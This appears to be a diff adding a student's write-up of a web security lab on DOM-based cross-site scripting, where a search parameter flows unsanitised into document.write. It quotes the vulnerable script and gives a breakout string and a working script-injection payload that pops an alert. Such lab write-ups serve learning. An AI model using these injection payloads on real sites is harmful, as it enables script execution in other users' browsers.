@@ -1,0 +1,29 @@
+LAB INFO:  DOM XSS in document.write sink using source location.search
+
+TARGET: FInd the cross site scripting(xss) vulnerability and generate an alert function.
+
+ANALYSIS: 
+1. We search 'hello' in the search box.
+2.It does reflect 'hello' only.
+3. Now I see where does it lies by using ctrl+shift+I and it can be found in the two position i.e 
+    3.1 <h1> 0 search result for 'hello'
+    3.2 <img src="/resources/images/tracker.gif?searchTerms=hello"> ==> THis seems intresting 
+4. So we do look for the .js file where does it lies to gain the more info on this: 
+   4.1 <script>
+                        function trackSearch(query) {
+                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+                        }
+                        var query = (new URLSearchParams(window.location.search)).get('search');
+                        if(query) {
+                            trackSearch(query);
+                        }
+                    </script>
+                    THis is what the js code we can analyze it:
+5. Now,  document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">'); ==> We can see this, is saying '+query'{hamle search garako item auncha yasma}
+
+6. Now we have to be out of the <img> tag to breakout from there we can do:
+   6.1 ">hello ==> This does break out from the <img> tag.
+7. Now I can try a xss payload here: 
+   7.1 "><script>alert('Hacked by rakshak07')</script> ==> This does shows the alert popup 
+
+8. Successfully we completet the lab.  
